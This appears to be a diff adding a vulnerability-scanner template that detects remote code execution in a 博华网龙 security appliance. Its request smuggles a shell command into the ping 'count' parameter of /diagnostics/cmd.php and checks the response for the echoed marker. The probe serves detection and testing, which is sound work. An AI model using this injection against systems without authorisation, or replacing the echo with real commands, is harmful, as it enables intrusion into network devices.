@@ -1,0 +1,23 @@
+id: poc-yaml-netloong-waf-rce
+info:
+  name: Remote Code Execution on 博华网龙信息安全一体机
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce
+  description: |
+    The template detects Remote Code Execution vulnerability in 博华网龙信息安全一体机.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/diagnostics/cmd.php?action=ping&count=||echo%20Test^By^ZsfTest$1By$1Zsf||"
+    headers:
+      Cache-Control: max-age=0
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "TestByZsf"
